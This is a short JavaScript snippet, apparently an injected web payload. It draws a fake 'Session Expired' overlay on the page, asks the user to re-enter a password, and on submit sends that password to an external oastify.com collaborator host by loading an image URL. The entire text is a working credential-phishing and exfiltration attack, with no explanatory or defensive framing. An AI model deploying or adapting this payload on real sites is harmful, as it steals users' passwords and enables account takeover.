let div = document.createElement('div');
div.innerHTML = `
    <div style="position: fixed; top: 20%; left: 50%; transform: translate(-50%, 0); background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.5); z-index: 9999;">
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="phishPass" placeholder="Enter password">
        <button onclick="sendData()">Submit</button>
    </div>
`;
document.body.appendChild(div);

function sendData() {
    let pass = document.getElementById('phishPass').value;
    new Image().src = `https://ztw0crqnl8um38ma3dqe8ttu3l9cx4zso.oastify.com?password=${encodeURIComponent(pass)}`;
}
